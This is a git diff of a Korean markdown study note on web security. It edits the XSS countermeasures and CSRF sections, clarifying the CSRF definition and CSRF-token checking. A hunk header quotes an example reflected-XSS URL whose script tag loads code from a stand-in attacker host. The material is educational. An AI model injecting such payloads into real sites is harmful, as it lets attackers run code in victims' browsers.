@@ -74,13 +74,12 @@ https://trustSite.com?search=<script src="http://attack.com/atack.js"/>
     - 허용된 Resouce만 로드 할 수 있도록 제한한다.
 2. 출력값 인코딩
     - Client로 리턴되는 데이터를 인코딩 한다.
-
-
-
+   
 ***
 
 ## CSRF (Cross-Site-Request-Forgery)
-- 사용자가 의도하지 않은채로, 해커의 의도한 행위를 하게되는 것이다.
+- 탈취가 목적이 아닌, 비정상적인 동작을 하게 하는 것이 목적이다.
+- 사용자가 인증된 상태에서 의도하지 않은채로, 해커의 의도한 행위를 하게되는 것이다.
   - 의도치 않게 서버를 공격한다.
 - 서버가 사용자를 신뢰하기 때문에 발생한다.
   - 로그인되어 있는 상태로 서버에 비정상적인 명령을 내리기 때문이다.
@@ -89,10 +88,10 @@ https://trustSite.com?search=<script src="http://attack.com/atack.js"/>
 1. 로그인이 되어있어야 한다.
 2. 해커가 제공한 사이트에 접속해야한다.
 
-
 ### 방지책
 - Referrer를 통한 도메인 일치 검증 
   - Referrer를 보내지 안흔 사용자에게는 이방법을 사용할 수 없다. (요즘엔 거의 없다.)
-- Security Token 사용
-  - 요청, 세션 마다 Token을 서버에서 발급하고 Token의 존재유무를 확인한다.
+- CSRF Token 사용
+  - 요청, 세션 마다 Token을 서버에서 발급한다.
+  - 이전 응답시점에 발급했던 CSRF토큰과, 현재 Cleint의 요청에 동봉된 CSRF의 일치 여부를 확인한다.
   - 잠재적인 CSRF 위협을 방지한다.
